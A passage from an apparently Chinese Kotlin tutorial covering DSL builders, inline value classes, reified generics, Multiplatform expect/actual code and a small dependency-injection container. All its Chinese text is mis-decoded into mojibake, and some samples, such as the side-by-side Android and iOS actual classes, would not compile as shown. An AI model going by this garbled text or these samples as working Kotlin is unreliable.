    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">body</span><span class="hljs-params">(content: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-keyword">this</span>.body = content
        header(<span class="hljs-string">"Content-Length"</span>, content.length.toString())
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span></span>: String {
        <span class="hljs-comment">// æ¨¡æ‹Ÿ HTTP è¯·æ±‚</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"HTTP <span class="hljs-variable">$method</span> <span class="hljs-variable">$url</span> - Headers: <span class="hljs-variable">$headers</span> - Body: <span class="hljs-variable">$body</span>"</span>
    }
}

<span class="hljs-comment">// DSL æ‰©å±•å‡½æ•°</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">httpRequest</span><span class="hljs-params">(block: <span class="hljs-type">HttpRequestBuilder</span>.() -&gt; <span class="hljs-type">Unit</span>)</span></span>: String {
    <span class="hljs-keyword">val</span> builder = HttpRequestBuilder()
    builder.block()
    <span class="hljs-keyword">return</span> builder.execute()
}

<span class="hljs-comment">// ä½¿ç”¨ç±»å‹å®‰å…¨æ„å»ºå™¨</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testHttpBuilder</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> response = httpRequest {
        method = <span class="hljs-string">"POST"</span>
        url = <span class="hljs-string">"https://api.example.com/users"</span>
        header(<span class="hljs-string">"Authorization"</span>, <span class="hljs-string">"Bearer token123"</span>)
        header(<span class="hljs-string">"Content-Type"</span>, <span class="hljs-string">"application/json"</span>)
        body = <span class="hljs-string">"""{"name": "Alice", "age": 25}"""</span>
    }
    
    println(<span class="hljs-string">"HTTP å“åº”: <span class="hljs-variable">$response</span>"</span>)
}
</code></pre>
<h4 data-id="heading-7"><strong>å››åä¸€ã€æ·±åº¦æ€§èƒ½ä¼˜åŒ–æŠ€æœ¯</strong></h4>
<h5 data-id="heading-8"><strong>1. å†…è”ç±»ä¸å€¼ç±»çš„æ€§èƒ½ä¼˜åŒ–</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@JvmInline</span>
value <span class="hljs-keyword">class</span> <span class="hljs-title class_">Meter</span>(<span class="hljs-keyword">val</span> value: <span class="hljs-built_in">Double</span>) {
    <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">plus</span><span class="hljs-params">(other: <span class="hljs-type">Meter</span>)</span></span>: Meter = Meter(value + other.value)
    <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">times</span><span class="hljs-params">(factor: <span class="hljs-type">Double</span>)</span></span>: Meter = Meter(value * factor)
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">toKilometers</span><span class="hljs-params">()</span></span>: Kilometer = Kilometer(value / <span class="hljs-number">1000.0</span>)
}

<span class="hljs-meta">@JvmInline</span>
value <span class="hljs-keyword">class</span> <span class="hljs-title class_">Kilometer</span>(<span class="hljs-keyword">val</span> value: <span class="hljs-built_in">Double</span>) {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">toMeters</span><span class="hljs-params">()</span></span>: Meter = Meter(value * <span class="hljs-number">1000.0</span>)
}

<span class="hljs-comment">// ä½¿ç”¨å†…è”ç±»è¿›è¡Œç±»å‹å®‰å…¨è®¡ç®—</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">calculateDistance</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> distance1 = Meter(<span class="hljs-number">500.0</span>)
    <span class="hljs-keyword">val</span> distance2 = Meter(<span class="hljs-number">300.0</span>)
    <span class="hljs-keyword">val</span> total = distance1 + distance2
    <span class="hljs-keyword">val</span> scaled = total * <span class="hljs-number">2.5</span>
    
    println(<span class="hljs-string">"æ€»è·ç¦»: <span class="hljs-subst">${total.value}</span> ç±³"</span>)
    println(<span class="hljs-string">"ç¼©æ”¾å: <span class="hljs-subst">${scaled.value}</span> ç±³"</span>)
    println(<span class="hljs-string">"è½¬æ¢ä¸ºå…¬é‡Œ: <span class="hljs-subst">${scaled.toKilometers().value}</span> å…¬é‡Œ"</span>)
    
    <span class="hljs-comment">// ç¼–è¯‘é”™è¯¯ï¼šç±»å‹å®‰å…¨</span>
    <span class="hljs-comment">// val invalid = distance1 + scaled.toKilometers() // ç¼–è¯‘é”™è¯¯ï¼</span>
}

<span class="hljs-comment">// å†…è”ç±»çš„é›†åˆæ“ä½œä¼˜åŒ–</span>
<span class="hljs-meta">@JvmInline</span>
value <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserId</span>(<span class="hljs-keyword">val</span> value: <span class="hljs-built_in">Int</span>)

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">optimizeCollections</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> userIds = listOf(UserId(<span class="hljs-number">1</span>), UserId(<span class="hljs-number">2</span>), UserId(<span class="hljs-number">3</span>))
    
    <span class="hljs-comment">// è¿™äº›æ“ä½œåœ¨è¿è¡Œæ—¶ä¸ä¼šäº§ç”ŸåŒ…è£…å¯¹è±¡å¼€é”€</span>
    <span class="hljs-keyword">val</span> mapped = userIds.map { it.value * <span class="hljs-number">2</span> }
    <span class="hljs-keyword">val</span> filtered = userIds.filter { it.value &gt; <span class="hljs-number">1</span> }
    
    println(<span class="hljs-string">"æ˜ å°„ç»“æœ: <span class="hljs-variable">$mapped</span>"</span>)
    println(<span class="hljs-string">"è¿‡æ»¤ç»“æœ: <span class="hljs-variable">$filtered</span>"</span>)
}
</code></pre>
<h5 data-id="heading-9"><strong>2. å†…è”å‡½æ•°ä¸ reified ç±»å‹å‚æ•°çš„é«˜çº§ç”¨æ³•</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> kotlin.reflect.KClass

<span class="hljs-comment">// é«˜çº§ reified ç”¨æ³•</span>
<span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;<span class="hljs-keyword">reified</span> T : Any&gt;</span> <span class="hljs-title">createInstance</span><span class="hljs-params">(<span class="hljs-keyword">vararg</span> args: <span class="hljs-type">Any</span>)</span></span>: T {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> (T::<span class="hljs-keyword">class</span>) {
        String::<span class="hljs-keyword">class</span> -&gt; <span class="hljs-string">""</span> <span class="hljs-keyword">as</span> T
        <span class="hljs-built_in">Int</span>::<span class="hljs-keyword">class</span> -&gt; <span class="hljs-number">0</span> <span class="hljs-keyword">as</span> T
        List::<span class="hljs-keyword">class</span> -&gt; emptyList&lt;Any&gt;() <span class="hljs-keyword">as</span> T
        Map::<span class="hljs-keyword">class</span> -&gt; emptyMap&lt;Any, Any&gt;() <span class="hljs-keyword">as</span> T
        <span class="hljs-keyword">else</span> -&gt; <span class="hljs-keyword">throw</span> IllegalArgumentException(<span class="hljs-string">"ä¸æ”¯æŒçš„ç±»å‹"</span>)
    }
}

<span class="hljs-comment">// ç±»å‹å®‰å…¨çš„éªŒè¯æ¡†æ¶</span>
<span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;<span class="hljs-keyword">reified</span> T&gt;</span> <span class="hljs-title">validate</span><span class="hljs-params">(value: <span class="hljs-type">Any</span>, validator: <span class="hljs-type">T</span>.() -&gt; <span class="hljs-type">Boolean</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">is</span> T) {
        value.validator()
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-literal">false</span>
    }
}

<span class="hljs-comment">// ä½¿ç”¨é«˜çº§å†…è”å‡½æ•°</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testAdvancedInline</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> stringInstance: String = createInstance()
    <span class="hljs-keyword">val</span> listInstance: List&lt;Any&gt; = createInstance()
    
    println(<span class="hljs-string">"åˆ›å»ºçš„å®ä¾‹: <span class="hljs-variable">$stringInstance</span>, <span class="hljs-variable">$listInstance</span>"</span>)
    
    <span class="hljs-comment">// ç±»å‹å®‰å…¨éªŒè¯</span>
    <span class="hljs-keyword">val</span> email = <span class="hljs-string">"test@example.com"</span>
    <span class="hljs-keyword">val</span> isValidEmail = validate(email) {
        contains(<span class="hljs-string">"@"</span>) &amp;&amp; length &gt; <span class="hljs-number">5</span>
    }
    
    <span class="hljs-keyword">val</span> number = <span class="hljs-number">42</span>
    <span class="hljs-keyword">val</span> isValidNumber = validate(number) {
        <span class="hljs-keyword">this</span> <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.100</span>
    }
    
    println(<span class="hljs-string">"é‚®ç®±éªŒè¯: <span class="hljs-variable">$isValidEmail</span>"</span>)
    println(<span class="hljs-string">"æ•°å­—éªŒè¯: <span class="hljs-variable">$isValidNumber</span>"</span>)
}
</code></pre>
<h4 data-id="heading-10"><strong>å››åäºŒã€Kotlin å¤šå¹³å°é¡¹ç›®ï¼ˆKMPï¼‰é«˜çº§ç‰¹æ€§</strong></h4>
<h5 data-id="heading-11"><strong>1. å…±äº«ä¸šåŠ¡é€»è¾‘ä¸å¹³å°ç‰¹å®šå®ç°</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// é€šç”¨ä¸šåŠ¡æ¨¡å‹</span>
<span class="hljs-keyword">expect</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DateTimeFormatter</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">format</span><span class="hljs-params">(timestamp: <span class="hljs-type">Long</span>)</span></span>: String
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">parse</span><span class="hljs-params">(dateString: <span class="hljs-type">String</span>)</span></span>: <span class="hljs-built_in">Long</span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">EventLogger</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> formatter: DateTimeFormatter) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> events = mutableListOf&lt;String&gt;()
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">logEvent</span><span class="hljs-params">(event: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-keyword">val</span> timestamp = System.currentTimeMillis()
        <span class="hljs-keyword">val</span> formattedTime = formatter.format(timestamp)
        events.add(<span class="hljs-string">"[<span class="hljs-variable">$formattedTime</span>] <span class="hljs-variable">$event</span>"</span>)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getEvents</span><span class="hljs-params">()</span></span>: List&lt;String&gt; = events.toList()
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">clear</span><span class="hljs-params">()</span></span> {
        events.clear()
    }
}

<span class="hljs-comment">// Android å®ç°</span>
<span class="hljs-keyword">actual</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DateTimeFormatter</span> <span class="hljs-title">actual</span> <span class="hljs-keyword">constructor</span>() {
    <span class="hljs-keyword">actual</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">format</span><span class="hljs-params">(timestamp: <span class="hljs-type">Long</span>)</span></span>: String {
        <span class="hljs-comment">// ä½¿ç”¨ Android çš„ DateFormat</span>
        <span class="hljs-keyword">return</span> android.text.format.DateFormat.format(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>, timestamp).toString()
    }
    
    <span class="hljs-keyword">actual</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">parse</span><span class="hljs-params">(dateString: <span class="hljs-type">String</span>)</span></span>: <span class="hljs-built_in">Long</span> {
        <span class="hljs-comment">// Android ç‰¹å®šçš„è§£æé€»è¾‘</span>
        <span class="hljs-keyword">return</span> java.text.SimpleDateFormat(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>).parse(dateString).time
    }
}

<span class="hljs-comment">// iOS å®ç°  </span>
<span class="hljs-keyword">actual</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DateTimeFormatter</span> <span class="hljs-title">actual</span> <span class="hljs-keyword">constructor</span>() {
    <span class="hljs-keyword">actual</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">format</span><span class="hljs-params">(timestamp: <span class="hljs-type">Long</span>)</span></span>: String {
        <span class="hljs-comment">// ä½¿ç”¨ iOS çš„ DateFormatter</span>
        <span class="hljs-keyword">val</span> formatter = iosFoundation.NSDateFormatter()
        formatter.dateFormat = <span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>
        <span class="hljs-keyword">return</span> formatter.stringFromDate(iosFoundation.NSDate(timestamp))
    }
    
    <span class="hljs-keyword">actual</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">parse</span><span class="hljs-params">(dateString: <span class="hljs-type">String</span>)</span></span>: <span class="hljs-built_in">Long</span> {
        <span class="hljs-keyword">val</span> formatter = iosFoundation.NSDateFormatter()
        formatter.dateFormat = <span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>
        <span class="hljs-keyword">return</span> formatter.dateFromString(dateString)?.timeIntervalSince1970?.toLong() ?: <span class="hljs-number">0L</span>
    }
}
</code></pre>
<h5 data-id="heading-12"><strong>2. KMP ä¸­çš„å¹¶å‘å¤„ç†</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">expect</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PlatformCoroutineDispatcher</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">dispatch</span><span class="hljs-params">(block: () -&gt; <span class="hljs-type">Unit</span>)</span></span>
}

<span class="hljs-keyword">actual</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PlatformCoroutineDispatcher</span> <span class="hljs-title">actual</span> <span class="hljs-keyword">constructor</span>() {
    <span class="hljs-keyword">actual</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">dispatch</span><span class="hljs-params">(block: () -&gt; <span class="hljs-type">Unit</span>)</span></span> {
        <span class="hljs-comment">// Android: Handler(Looper.getMainLooper()).post(block)</span>
        <span class="hljs-comment">// iOS: DispatchQueue.main.async { block() }</span>
        block() <span class="hljs-comment">// ç®€åŒ–å®ç°</span>
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">CrossPlatformService</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> dispatcher: PlatformCoroutineDispatcher) {
    <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchData</span><span class="hljs-params">()</span></span>: String = withContext(createDispatcherContext(dispatcher)) {
        delay(<span class="hljs-number">1000</span>) <span class="hljs-comment">// æ¨¡æ‹Ÿç½‘ç»œè¯·æ±‚</span>
        <span class="hljs-string">"è·¨å¹³å°æ•°æ®"</span>
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createDispatcherContext</span><span class="hljs-params">(dispatcher: <span class="hljs-type">PlatformCoroutineDispatcher</span>)</span></span> = 
        <span class="hljs-keyword">object</span> : CoroutineDispatcher() {
            <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">dispatch</span><span class="hljs-params">(context: <span class="hljs-type">CoroutineContext</span>, block: <span class="hljs-type">Runnable</span>)</span></span> {
                dispatcher.dispatch { block.run() }
            }
        }
}
</code></pre>
<h4 data-id="heading-13"><strong>å››åä¸‰ã€Kotlin æœªæ¥ç‰¹æ€§æ¢ç´¢</strong></h4>
<h5 data-id="heading-14"><strong>1. ä¸Šä¸‹æ–‡æ¥æ”¶å™¨ï¼ˆContext Receiversï¼‰åŸå‹</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// æ¨¡æ‹Ÿä¸Šä¸‹æ–‡æ¥æ”¶å™¨åŠŸèƒ½</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">DatabaseContext</span> {
    <span class="hljs-keyword">val</span> connection: DatabaseConnection
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">LoggingContext</span> {
    <span class="hljs-keyword">val</span> logger: Logger
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DatabaseConnection</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">executeQuery</span><span class="hljs-params">(sql: <span class="hljs-type">String</span>)</span></span>: String = <span class="hljs-string">"æŸ¥è¯¢ç»“æœ: <span class="hljs-variable">$sql</span>"</span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Logger</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">info</span><span class="hljs-params">(message: <span class="hljs-type">String</span>)</span></span> = println(<span class="hljs-string">"[INFO] <span class="hljs-variable">$message</span>"</span>)
}

<span class="hljs-comment">// ä½¿ç”¨ä¸Šä¸‹æ–‡å‚æ•°æ¨¡æ‹Ÿä¸Šä¸‹æ–‡æ¥æ”¶å™¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> dbContext: DatabaseContext,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> logContext: LoggingContext
) {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getUser</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: String {
        logContext.logger.info(<span class="hljs-string">"è·å–ç”¨æˆ· <span class="hljs-variable">$id</span>"</span>)
        <span class="hljs-keyword">return</span> dbContext.connection.executeQuery(<span class="hljs-string">"SELECT * FROM users WHERE id = <span class="hljs-variable">$id</span>"</span>)
    }
}

<span class="hljs-comment">// ç®€åŒ–ä½¿ç”¨æ–¹å¼</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testContextReceivers</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> dbContext = <span class="hljs-keyword">object</span> : DatabaseContext {
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> connection = DatabaseConnection()
    }
    
    <span class="hljs-keyword">val</span> logContext = <span class="hljs-keyword">object</span> : LoggingContext {
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> logger = Logger()
    }
    
    <span class="hljs-keyword">val</span> userService = UserService(dbContext, logContext)
    <span class="hljs-keyword">val</span> result = userService.getUser(<span class="hljs-number">1</span>)
    println(result)
}
</code></pre>
<h5 data-id="heading-15"><strong>2. è‡ªå®šä¹‰æ“ä½œç¬¦ä¸ DSL æ·±åº¦é›†æˆ</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// è‡ªå®šä¹‰æ•°å­¦ DSL</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Vector</span>(<span class="hljs-keyword">val</span> x: <span class="hljs-built_in">Double</span>, <span class="hljs-keyword">val</span> y: <span class="hljs-built_in">Double</span>, <span class="hljs-keyword">val</span> z: <span class="hljs-built_in">Double</span>) {
    <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">plus</span><span class="hljs-params">(other: <span class="hljs-type">Vector</span>)</span></span>: Vector = 
        Vector(x + other.x, y + other.y, z + other.z)
    
    <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">minus</span><span class="hljs-params">(other: <span class="hljs-type">Vector</span>)</span></span>: Vector =
        Vector(x - other.x, y - other.y, z - other.z)
    
    <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">times</span><span class="hljs-params">(scalar: <span class="hljs-type">Double</span>)</span></span>: Vector =
        Vector(x * scalar, y * scalar, z * scalar)
    
    <span class="hljs-keyword">infix</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">dot</span><span class="hljs-params">(other: <span class="hljs-type">Vector</span>)</span></span>: <span class="hljs-built_in">Double</span> =
        x * other.x + y * other.y + z * other.z
    
    <span class="hljs-keyword">infix</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">cross</span><span class="hljs-params">(other: <span class="hljs-type">Vector</span>)</span></span>: Vector =
        Vector(
            y * other.z - z * other.y,
            z * other.x - x * other.z,
            x * other.y - y * other.x
        )
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">toString</span><span class="hljs-params">()</span></span>: String = <span class="hljs-string">"(<span class="hljs-variable">$x</span>, <span class="hljs-variable">$y</span>, <span class="hljs-variable">$z</span>)"</span>
}

<span class="hljs-comment">// å‘é‡è¿ç®— DSL</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">vector</span><span class="hljs-params">(block: <span class="hljs-type">VectorBuilder</span>.() -&gt; <span class="hljs-type">Unit</span>)</span></span>: Vector {
    <span class="hljs-keyword">val</span> builder = VectorBuilder()
    builder.block()
    <span class="hljs-keyword">return</span> builder.build()
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">VectorBuilder</span> {
    <span class="hljs-keyword">var</span> x = <span class="hljs-number">0.0</span>
    <span class="hljs-keyword">var</span> y = <span class="hljs-number">0.0</span>
    <span class="hljs-keyword">var</span> z = <span class="hljs-number">0.0</span>
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">x</span><span class="hljs-params">(value: <span class="hljs-type">Double</span>)</span></span> { x = value }
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">y</span><span class="hljs-params">(value: <span class="hljs-type">Double</span>)</span></span> { y = value }
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">z</span><span class="hljs-params">(value: <span class="hljs-type">Double</span>)</span></span> { z = value }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">build</span><span class="hljs-params">()</span></span>: Vector = Vector(x, y, z)
}

<span class="hljs-comment">// ä½¿ç”¨å‘é‡ DSL</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testVectorDSL</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> v1 = vector { x(<span class="hljs-number">1.0</span>); y(<span class="hljs-number">2.0</span>); z(<span class="hljs-number">3.0</span>) }
    <span class="hljs-keyword">val</span> v2 = vector { x(<span class="hljs-number">4.0</span>); y(<span class="hljs-number">5.0</span>); z(<span class="hljs-number">6.0</span>) }
    
    <span class="hljs-keyword">val</span> sum = v1 + v2
    <span class="hljs-keyword">val</span> difference = v1 - v2
    <span class="hljs-keyword">val</span> scaled = v1 * <span class="hljs-number">2.5</span>
    <span class="hljs-keyword">val</span> dotProduct = v1 dot v2
    <span class="hljs-keyword">val</span> crossProduct = v1 cross v2
    
    println(<span class="hljs-string">"å‘é‡è¿ç®—ç»“æœ:"</span>)
    println(<span class="hljs-string">"å’Œ: <span class="hljs-variable">$sum</span>"</span>)
    println(<span class="hljs-string">"å·®: <span class="hljs-variable">$difference</span>"</span>)
    println(<span class="hljs-string">"ç¼©æ”¾: <span class="hljs-variable">$scaled</span>"</span>)
    println(<span class="hljs-string">"ç‚¹ç§¯: <span class="hljs-variable">$dotProduct</span>"</span>)
    println(<span class="hljs-string">"å‰ç§¯: <span class="hljs-variable">$crossProduct</span>"</span>)
}
</code></pre>
<h4 data-id="heading-16"><strong>å››åå››ã€Kotlin å…ƒç¼–ç¨‹ç»ˆæå®æˆ˜ï¼šæ„å»ºè¿·ä½ æ¡†æ¶</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> kotlin.reflect.full.*

<span class="hljs-comment">// è¿·ä½ ä¾èµ–æ³¨å…¥æ¡†æ¶</span>
<span class="hljs-keyword">annotation</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject</span>
<span class="hljs-keyword">annotation</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DIContainer</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> instances = mutableMapOf&lt;KClass&lt;*&gt;, Any&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> bindings = mutableMapOf&lt;KClass&lt;*&gt;, KClass&lt;*&gt;&gt;()
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T : Any&gt;</span> <span class="hljs-title">register</span><span class="hljs-params">(clazz: <span class="hljs-type">KClass</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span> {
        instances[clazz] = createInstance(clazz)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T : Any&gt;</span> <span class="hljs-title">register</span><span class="hljs-params">(interfaceClass: <span class="hljs-type">KClass</span>&lt;<span class="hljs-type">T</span>&gt;, implementationClass: <span class="hljs-type">KClass</span>&lt;<span class="hljs-type">out</span> <span class="hljs-type">T</span>&gt;)</span></span> {
        bindings[interfaceClass] = implementationClass
    }
    
    <span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;<span class="hljs-keyword">reified</span> T : Any&gt;</span> <span class="hljs-title">get</span><span class="hljs-params">()</span></span>: T {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">get</span>(T::<span class="hljs-keyword">class</span>)
    }
    
    <span class="hljs-meta">@Suppress(<span class="hljs-string">"UNCHECKED_CAST"</span>)</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T : Any&gt;</span> <span class="hljs-title">get</span><span class="hljs-params">(clazz: <span class="hljs-type">KClass</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span>: T {
        <span class="hljs-comment">// æ£€æŸ¥å•ä¾‹å®ä¾‹</span>
        <span class="hljs-keyword">if</span> (instances.containsKey(clazz)) {
            <span class="hljs-keyword">return</span> instances[clazz] <span class="hljs-keyword">as</span> T
        }
        
        <span class="hljs-comment">// æ£€æŸ¥æ¥å£ç»‘å®š</span>
        <span class="hljs-keyword">val</span> targetClass = bindings[clazz] ?: clazz
        
        <span class="hljs-comment">// åˆ›å»ºæ–°å®ä¾‹</span>
        <span class="hljs-keyword">val</span> instance = createInstance(targetClass <span class="hljs-keyword">as</span> KClass&lt;T&gt;)
        
        <span class="hljs-comment">// å¦‚æœæ˜¯å•ä¾‹ï¼Œä¿å­˜å®ä¾‹</span>
        <span class="hljs-keyword">if</span> (targetClass.hasAnnotation&lt;Singleton&gt;()) {
            instances[clazz] = instance
        }
        
        <span class="hljs-keyword">return</span> instance
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T : Any&gt;</span> <span class="hljs-title">createInstance</span><span class="hljs-params">(clazz: <span class="hljs-type">KClass</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span>: T {
        <span class="hljs-keyword">val</span> <span class="hljs-keyword">constructor</span> = clazz.primaryConstructor
            ?: <span class="hljs-keyword">throw</span> IllegalArgumentException(<span class="hljs-string">"ç±» <span class="hljs-subst">${clazz.simpleName}</span> æ²¡æœ‰ä¸»æ„é€ å‡½æ•°"</span>)
        
        <span class="hljs-keyword">val</span> parameters = <span class="hljs-keyword">constructor</span>.parameters.map { param -&gt;
            <span class="hljs-keyword">if</span> (param.hasAnnotation&lt;Inject&gt;()) {
                <span class="hljs-keyword">get</span>(param.type.classifier <span class="hljs-keyword">as</span> KClass&lt;*&gt;)
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">throw</span> IllegalArgumentException(<span class="hljs-string">"æ— æ³•è§£æä¾èµ–: <span class="hljs-subst">${param.name}</span>"</span>)
            }
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">constructor</span>.call(*parameters.toTypedArray())
    }
}

<span class="hljs-comment">// ä½¿ç”¨è¿·ä½  DI æ¡†æ¶</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserRepository</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">findUser</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: String
}

<span class="hljs-meta">@Singleton</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DatabaseUserRepository</span> <span class="hljs-meta">@Inject</span> <span class="hljs-keyword">constructor</span>() : UserRepository {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">findUser</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: String = <span class="hljs-string">"ç”¨æˆ· <span class="hljs-variable">$id</span> æ¥è‡ªæ•°æ®åº“"</span>
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getUser</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: String
}

<span class="hljs-meta">@Singleton</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-meta">@Inject</span> <span class="hljs-keyword">constructor</span>(
